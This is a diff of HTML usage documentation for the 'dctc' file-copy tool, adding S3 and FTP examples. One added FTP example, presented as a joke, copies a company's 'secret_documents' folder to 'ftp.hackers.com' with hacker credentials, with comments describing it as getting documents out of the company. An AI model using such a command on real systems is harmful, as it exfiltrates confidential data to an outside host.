@@ -152,6 +152,10 @@ account2.secret_key = B123qsdiojpazeokpz235/ZHjqbuohzaiojz2</pre></code>
         </ul>
         
         <p>Non-default accounts are accessed using the <code>s3://account@bucket/path</code> syntax.</p>
+        
+         <p>For example, to copy a file from the default S3 account to a specific S3 account:</p>
+        <code><pre>% dctc cp s3://bucket1/folder/path s3://account2@bucket2/other_folder/path</pre></code>
+
 
         <h1>Google Cloud Storage</h1>
 
@@ -198,11 +202,16 @@ account2.secret_key = /Users/john/secret/gs/key_123095490690384.p12</pre></code>
 
         <h1>FTP</h1>
 
-        <p>FTP can operate either with a configuration specifying hostname, username and password, or by specifying all data on the command line.</p>
-
+        <p><code>dctc</code> can operate on FTP filesystems:</p>
+          
+        <ul>
+          <li>either using the configuration file, with an account specifying the hostname, username and password,</li>
+          <li>or by specifying all required data in the URL</li>
+        </ul>
+          
         <h3>With configuration</h3>
 
-        <p>Configuration for a FTP connection must contain the following parameters:</p>
+        <p>Configuration for a FTP account must contain the following parameters:</p>
         <ul>
           <li><strong>host</strong>: FTP Server host name</li>
           <li><strong>username</strong>: User name</li>
@@ -210,20 +219,41 @@ account2.secret_key = /Users/john/secret/gs/key_123095490690384.p12</pre></code>
         </ul>
 
         <p>
-                You must then connect using the name of the account in the configuration file.
+          In the file URL, you then need to use the name of the account.
           For example: <code>ftp://accountname@/path/on/the/ftp/server</code>
         </p>
 
-        <p><strong>Important note: </strong> FTP does not support the "default" account. You must always explicitely select an account.</p>
+        <p><strong>Important note: </strong> FTP does not support the notion of "default" account.
+        You must always explicitely indicate an account with <code>accountname@</code>.</p>
 
-        <h3>On the command line</h3>
+        <h3>Specifying data in the URL</h3>
 
-        <p>You can connect either anonymously or with a login password:</p>
+        <p>You can specify on the URL a FTP connection, either with anonymous FTP connection or with a login:</p>
         <ul>
           <li><code>ftp://host/path</code></li>
           <li><code>ftp://username:password@host/path</code></li>
         </ul>
 
+        <h3>Example</h3>
+        
+        <p>With the following configuration file:</p>
+        <pre><code>[ftp]
+company.hostname = ftp.mycompany.com
+company.username = john
+company.password = thisisaverysecretpasswordnobodywillguessit
+        </code></pre>
+        
+        <p>you could have the following:</p>
+        
+        <pre><code>% dctc cp -R ftp://company@/secret_documents ftp://hacker:h4cK3RZP4ssword@ftp.hackers.com/path
+# Get some documents out of the company FTP to ftp.hackers.com.
+# Connection data to company FTP is from the configuration file.
+# Connection data to hackers FTP is on the URL
+
+% dctc sync ftp://ftp.free.fr/pub/Distributions_Linux/debian-cd/ ftp://company@/debian-mirror
+# Synchronize incrementally all data from ftp.free.fr (which allows anonymous login) 
+# to a path on the company FTP</code></pre>
+        
 
 
         <h1>SCP / SFTP</h1>
